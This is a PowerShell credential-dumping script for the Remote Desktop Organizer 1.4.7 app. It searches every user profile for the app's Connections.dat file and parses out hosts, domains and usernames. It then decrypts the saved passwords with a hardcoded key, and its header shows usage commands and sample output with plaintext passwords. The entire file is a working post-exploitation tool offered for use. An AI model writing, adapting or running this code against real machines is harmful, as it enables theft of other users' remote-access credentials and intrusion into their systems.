<# 
.SYNOPSIS 
Coded By xVayNe 2016.06
 
.DESCRIPTION 
Only test on RDO 1.4.7.exe

.EXAMPLE 
Recommend use Decypt-Password

PS > RDO-Password
PS > Decypt-Password "***B1E5E1BF2459AB98D344A4EA31E604********"
...OR...
powershell Import-Module RDO-Password.ps1;Decypt-Password "***B1E5E1BF2459AB98D344A4EA31E604********"
powershell Import-Module RDO-Password.ps1;RDO-Password

.TESTDEMO
------------------------------------------------------
[+] C:\Users\Administrator\AppData\Local\RDO\Connections.dat
------------------------------------------------------
Connection:MY
Host:192.168.1.2
Domain:
User:administrator
Password:123456
-------------------
------------------------------------------------------
[+] C:\Users\Default.migrated\AppData\Local\RDO\Connections.dat
------------------------------------------------------
Connection:Home
Host:www.google.com
Domain:GOOGLE.corp
User:administrator
Password:qwerty
-------------------

#> 

function Decypt-Password()
{
	[CmdletBinding()]
	Param ([string]$Cipher)
	
	#fuck the '$' of powershell
	$PrivateKey = 'swevA2t62We?5Cr+he4Tac?_E!redafa?re5+2huv*$rU9eS8Ub4?W!!R+s7uthU';
	$PublicKey = [Text.Encoding]::ASCII.GetBytes("Ivan Medvedev");

	$CipherBytes = New-Object byte[] $($Cipher.Length/2);
	for ([int]$i=0; $i -lt $Cipher.Length/2; $i++)
	{
		$CipherBytes[$i] = [byte][Convert]::ToInt32($Cipher.Substring($i*2,2),16);
	}
	#Write-Output $CipherBytes
	#Write-Output $PrivateKey.Length
	$PasswdDerive = New-Object Security.Cryptography.PasswordDeriveBytes($PrivateKey, $PublicKey);

	$AesKey = $PasswdDerive.GetBytes(32);
	$AesIV = $PasswdDerive.GetBytes(16);

	$Rijndael = [Security.Cryptography.Rijndael]::Create();
	$Rijndael.Key = $AesKey;
	$Rijndael.IV = $AesIV;
	$MemStream = New-Object IO.MemoryStream;
	$CryptoStream = New-Object Security.Cryptography.CryptoStream(
											$MemStream,
											$Rijndael.CreateDecryptor(),
											[Security.Cryptography.CryptoStreamMode]::Write);
	$CryptoStream.Write($CipherBytes,0,$CipherBytes.Length);
	$CryptoStream.Close();

	$Password = [Text.Encoding]::Convert([Text.Encoding]::Unicode,[Text.Encoding]::ASCII,$MemStream.ToArray());
	$Password = [Text.Encoding]::ASCII.GetString($Password);
	return $Password;
}

function Bytes-Compare([byte[]]$s1, [byte[]]$s2, [int]$len)
{
	for ($i=0; $i -lt $len; $i++)
	{
		if ($s1[$i] -ne $s2[$i])
		{
			return $FALSE;
		}
	}
	return $TRUE;
}

function Get-Detail([byte[]]$ByteStream,[int]$Start,[bool]$First)
{
	$Distance0 = 0;
	$Distance1 = 5;
	$Distance2 = 5;
	$Distance3 = 5;
	
	
	$NameLen = [int]$ByteStream[$Start];
	$Name = New-Object byte[] $($NameLen);
	[Array]::Copy($ByteStream, $Start+1, $Name, 0, $NameLen);
	$Name = [Text.Encoding]::ASCII.GetString($Name);
	Write-Output "Connection:$Name";
	
	$Start += 1 + $NameLen;
	
	if ($First -eq $TRUE)
	{
		$Distance0 = 105;
	}
	else
	{
		for ($i=0; $i -lt 50; $i++)
		{
			$ArraySep = New-Object byte[] (4);
			$ArraySep[0] = 0x00;
			$ArraySep[1] = 0x00;
			$ArraySep[2] = 0x00;
			$ArraySep[3] = 0x06;
			$Sep = New-Object byte[] $($ArraySep.Length);
			[Array]::Copy($ByteStream, $i+$Start, $Sep, 0, $ArraySep.Length);
			$Result = Bytes-Compare $Sep $ArraySep $ArraySep.Length;
			if ($Result -eq $TRUE)
			{
				$Distance0 = $i;
			}
		}
		$Distance0 += 8;
	}

	$Start += $Distance0;
	$NameLen = [int]$ByteStream[$Start];
	$Name = New-Object byte[] $($NameLen);
	[Array]::Copy($ByteStream, $Start+1, $Name, 0, $NameLen);
	$Name = [Text.Encoding]::ASCII.GetString($Name);
	Write-Output "Host:$Name";
	
	$TempStart =  $Start + 1 + $NameLen + $Distance1;
	$TempLen = [int]$ByteStream[$TempStart];
		
	if ($ByteStream[$TempStart+$TempLen+1] -eq 0x06)
	{
		$Name = New-Object byte[] $($TempLen);
		[Array]::Copy($ByteStream, $TempStart+1, $Name, 0, $TempLen);
		$NameLen = $TempLen;
		$Start = $TempStart;
		$Name = [Text.Encoding]::ASCII.GetString($Name);
	}
	else
	{
		$Distance2 = 10;
		$Name = '';
	}

	Write-Output "Domain:$Name";	
	
	$Start += 1 + $NameLen + $Distance2;
	$NameLen = [int]$ByteStream[$Start];
	$Name = New-Object byte[] $($NameLen);
	[Array]::Copy($ByteStream, $Start+1, $Name, 0, $NameLen);
	$Name = [Text.Encoding]::ASCII.GetString($Name);
	Write-Output "User:$Name";
	
	$Start += 1 + $NameLen + $Distance3;
	$NameLen = [int]$ByteStream[$Start];
	$Name = New-Object byte[] $($NameLen);
	[Array]::Copy($ByteStream, $Start+1, $Name, 0, $NameLen);
	$Name = [Text.Encoding]::ASCII.GetString($Name);
	$Name = Decypt-Password $Name;
	Write-Output "Password:$Name";
	
	Write-Output "-------------------";
}


function Get-ConnectInformation([string]$FilePath)
{
	$ByteStream = [System.IO.File]::ReadAllBytes($FilePath)
	
	Write-Output "------------------------------------------------------";
	Write-Output "[+] $FilePath"
	Write-Output "------------------------------------------------------";
	
	$FirstSep = [Text.Encoding]::ASCII.GetBytes("System.Guid");
	for ($i=0; $i -lt $ByteStream.Length-$FirstSep.Length; $i++)
	{
		$Sep = New-Object byte[] $($FirstSep.Length);
		[Array]::Copy($ByteStream, $i, $Sep, 0, $FirstSep.Length);
		$Result = Bytes-Compare $Sep $FirstSep $FirstSep.Length;
		if ($Result -eq $TRUE)
		{
			$i = $i + $FirstSep.Length + 47;
			Get-Detail $ByteStream $i $TRUE;
			break;
		}		
	}

	$ArraySep = New-Object byte[] (8);
	$ArraySep[0] = 0x00;
	$ArraySep[1] = 0x00;
	$ArraySep[2] = 0x00;
	$ArraySep[3] = 0x0B;
	$ArraySep[4] = 0x00;
	$ArraySep[5] = 0x00;
	$ArraySep[6] = 0x00;
	$ArraySep[7] = 0x06;
	for ($i=0; $i -lt $ByteStream.Length-$ArraySep.Length; $i++)
	{
		$Sep = New-Object byte[] $($ArraySep.Length);
		[Array]::Copy($ByteStream, $i, $Sep, 0, $ArraySep.Length);
		$Result = Bytes-Compare $Sep $ArraySep $ArraySep.Length;
		if ($Result -eq $TRUE)
		{
			$i = $i + $ArraySep.Length + 4;
			Get-Detail $ByteStream $i $FALSE;
		}
	}
}

function RDO-Password()
{
	[CmdletBinding()]
	Param ()
	
	$MajorVer = [System.Environment]::OSVersion.Version.Major;
	
	if ($MajorVer -gt 5)
	{
		$UserProfile = $ENV:SystemDrive+"\Users\";
	}
	else
	{
		$UserProfile = $ENV:SystemDrive+"\Documents and Settings\";
	}

	Get-ChildItem $UserProfile | ForEach-Object -Process {
		if($_ -is [System.IO.DirectoryInfo])
		{
			$FilePath = $UserProfile+$_.name+"\AppData\Local\RDO\Connections.dat";
			if ([IO.File]::Exists($FilePath))
			{
				Get-ConnectInformation($FilePath);
			}

		}
	}
}

